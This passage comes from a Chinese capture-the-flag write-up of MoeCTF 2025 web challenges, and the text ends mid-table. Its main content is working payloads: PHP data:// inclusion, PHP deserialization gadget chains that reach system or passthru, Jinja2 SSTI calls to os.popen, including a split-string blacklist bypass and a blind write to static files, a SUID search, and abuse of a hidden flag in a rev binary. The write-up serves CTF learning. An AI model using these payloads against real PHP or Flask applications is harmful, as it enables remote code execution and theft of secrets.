class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls /&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-OrvL3PF4K1VMXkEVzkNTMJsa8Txt7c.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014163125848-1760512687700-69.png" alt="image-20251014163125848"></p><h3 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a><strong>17 第十七章 星骸迷阵·神念重构</strong></h3><h4 id="考点：php反序列化"><a href="#考点：php反序列化" class="headerlink" title="考点：php反序列化"></a>考点：php反序列化</h4><p><img src="/../images/image-20251014163228096-1760512687700-68.png" alt="image-20251014163228096"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=new A();</span><br><span class="line">$c-&gt;a=&quot;system(&#x27;env&#x27;);&quot;;</span><br><span class="line">echo serialize($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单的反序列化 给a复制相应的命令就好了</p><p><img src="/../images/image-20251014164009204-1760512687700-72.png" alt="image-20251014164009204"></p><h3 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a><strong>18 第十八章 万卷诡阁·功法连环</strong></h3><h4 id="考点：php反序列化-1"><a href="#考点：php反序列化-1" class="headerlink" title="考点：php反序列化"></a>考点：php反序列化</h4><p><img src="/../images/image-20251014164636541-1760512687700-73.png" alt="image-20251014164636541"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$code=&quot;phpinfo();&quot;;</span><br><span class="line">$personB=new PersonB($code);</span><br><span class="line">$personA=new PersonA($personB);</span><br><span class="line">$serialized=serialize($personA);</span><br><span class="line">print(urlencode($serialized));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意private以及函数构造</p><p><img src="/../images/image-20251014165356363-1760512687700-74.png" alt="image-20251014165356363"></p><h3 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a><strong>19 第十九章 星穹真相·补天归源</strong></h3><h4 id="考点php反序列化"><a href="#考点php反序列化" class="headerlink" title="考点php反序列化"></a>考点php反序列化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name-&gt;$id($age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __Check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $name($age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题多解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$cmd = &quot;cat /????&quot;;</span><br><span class="line"> </span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = &quot;system&quot;;</span><br><span class="line">$c-&gt;id = null;</span><br><span class="line"> </span><br><span class="line">$a = new PersonA();</span><br><span class="line"> </span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;__Check&quot;;</span><br><span class="line"> </span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"> </span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"> </span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">$c=new PersonC();</span><br><span class="line">$c-&gt;name=&quot;system&quot;;</span><br><span class="line">$c-&gt;age=&quot;love&quot;;</span><br><span class="line">$a=new PersonA();</span><br><span class="line">$a-&gt;name=$c; </span><br><span class="line">$a-&gt;id=&quot;__Check&quot;;</span><br><span class="line">$a-&gt;age=&quot;cat /f*&quot;;</span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo urlencode($payload);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a><strong>19 第十九章_revenge</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用了system</p><p><img src="/../images/image-20251015142726469-1760512687700-75.png" alt="image-20251015142726469"></p><p><a href="https://blog.csdn.net/2303_76585504/article/details/152668659">moectf 2025 writeup-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class Person&#123;public $name,$id,$age;&#125;</span><br><span class="line">class PersonA extends Person&#123;&#125;</span><br><span class="line">class PersonB extends Person&#123;&#125;</span><br><span class="line">class PersonC extends Person&#123;&#125;</span><br><span class="line">$c=new PersonC;$b=new PersonB;$a=new PersonA;</span><br><span class="line">$c-&gt;name=&#x27;passthru&#x27;;$c-&gt;id=$b;$c-&gt;age=&#x27;phantom&#x27;;</span><br><span class="line">$b-&gt;id=$a;$b-&gt;name=&#x27;env&gt;flag.txt&#x27;;</span><br><span class="line">$a-&gt;id=&#x27;check&#x27;;</span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;/proc/self/environ&quot;;</span><br><span class="line">$function = &quot;file_get_contents&quot;;</span><br><span class="line"></span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = $function;</span><br><span class="line"></span><br><span class="line">$a = new PersonA();</span><br><span class="line"></span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;check&quot;;</span><br><span class="line"></span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"></span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a><strong>20 第二十章 幽冥血海·幻语心魔</strong></h3><h4 id="考点：无限制SSTI"><a href="#考点：无限制SSTI" class="headerlink" title="考点：无限制SSTI"></a>考点：无限制<code>SSTI</code></h4><p><img src="/../images/image-20251014195214923-1760512687700-76.png" alt="image-20251014195214923"></p><p>使用的是<code>render_template_string()</code>函数动态渲染，用户可控的 <code>username</code>参数<strong>直接拼接</strong>到模板字符串中</p><p><img src="/../images/image-20251014195338347-1760512687700-77.png" alt="image-20251014195338347"></p><p>直接获得shell，查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read()&#125;&#125;&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014195629362-1760512687700-78.png" alt="image-20251014195629362"></p><h3 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a><strong>21 第二十一章 往生漩涡·言灵死局</strong></h3><h4 id="考点：简单限制SSTI"><a href="#考点：简单限制SSTI" class="headerlink" title="考点：简单限制SSTI"></a>考点：简单限制<code>SSTI</code></h4><p>源码还是和之前的一样但是加了一个黑名单</p><p><img src="/../images/image-20251014195837206-1760455318317-4-1760512687700-79.png" alt="image-20251014195837206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; 代替 &#123;&#123; ... &#125;&#125;</span><br><span class="line">拼接关键字[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014232940628-1760512687700-81.png" alt="image-20251014232940628"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;%print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read())%&#125;&amp;password=1</span><br></pre></td></tr></table></figure><h3 id="22-第二十二章-血海核心·千年手段"><a href="#22-第二十二章-血海核心·千年手段" class="headerlink" title="22 第二十二章 血海核心·千年手段"></a><strong>22 第二十二章 血海核心·千年手段</strong></h3><h4 id="考点：无回显SSTI"><a href="#考点：无回显SSTI" class="headerlink" title="考点：无回显SSTI"></a>考点：无回显<code>SSTI</code></h4><p><img src="/../images/image-20251014233417847-1760512687700-80.png" alt="image-20251014233417847"></p><p>没有将 <code>render_template_string</code> 函数的返回值赋给任何变量,即是无回显，常规的写文件到static【这里有多种解】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;env &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现flag不在环境变量里面，ls &#x2F; 发现flag但是没有权限读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;find / -perm -4000&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br><span class="line">【查找具有sudi权限文件】</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014234711691-1760512687700-84.png" alt="image-20251014234711691"></p><p>&#x2F;usr&#x2F;bin&#x2F;rev用于翻转字符串 但是发现无回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;/usr/bin/rev /flag&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>查看能够使用的命令,发现有个rev.c文件【实则看了官wp才知道】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; cat /usr/bin&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014235714305-1760512687700-85.png" alt="image-20251014235714305"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;cat /usr/bin/rev.c &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">    for(int i = 1; i + 1 &lt; argc; i++) &#123;</span><br><span class="line">        if (strcmp(&quot;--HDdss&quot;, argv[i]) == 0) &#123;</span><br><span class="line">            execvp(argv[i + 1], &amp;argv[i + 1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要使用--HDdss参数执行命令,就能获得flag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; /usr/bin/rev --HDdss cat /flag &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>官wp也说了，可以内存马打无回显,后面在ssti专题再去总结吧，已老实求放过</p><h3 id="【未完成】23-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#【未完成】23-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="【未完成】23 第二十三章 幻境迷心·皇陨星沉(大结局)"></a>【未完成】<strong>23 第二十三章 幻境迷心·皇陨星沉(大结局)</strong></h3><h4 id="考点：java反序列化"><a href="#考点：java反序列化" class="headerlink" title="考点：java反序列化"></a>考点：java反序列化</h4><h3 id="24-番外篇（1）摸金偶遇FLAG，拼尽全力难战胜"><a href="#24-番外篇（1）摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="24 番外篇（1）摸金偶遇FLAG，拼尽全力难战胜"></a>24 番外篇（1）<strong>摸金偶遇FLAG，拼尽全力难战胜</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">玩家需要在限定时间内破译9位摩斯密码数字序列</span><br><span class="line">左侧显示需要破译的摩斯密码序列</span><br><span class="line">右侧提供数字键盘输入答案</span><br><span class="line">每个数字对应特定的摩斯密码图案（点·和线━）</span><br></pre></td></tr></table></figure><p>接受传递的数据，再post请求回去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/get_challenge?count=9&#x27;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(d =&gt; &#123;</span><br><span class="line">    console.log(&#x27;answers:&#x27;, d.numbers, &#x27;token:&#x27;, d.token);</span><br><span class="line">return fetch(&#x27;/verify&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;answers: d.numbers, token: d.token&#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.json())</span><br><span class="line">.then(data =&gt; console.log(&#x27;verify result:&#x27;, data));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251015105326728-1760512687700-83.png" alt="image-20251015105326728"></p><h3 id="25-番外篇（2）这是…Webshell？"><a href="#25-番外篇（2）这是…Webshell？" class="headerlink" title="25 番外篇（2）这是…Webshell？"></a>25 番外篇（2）<strong>这是…Webshell？</strong></h3><h4 id="考点：无字母数字rce绕过"><a href="#考点：无字母数字rce绕过" class="headerlink" title="考点：无字母数字rce绕过"></a>考点：无字母数字rce绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">    $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>无字母无数字的rce绕过,异或</p><figure class="highlight plaintext"><table><tr><td 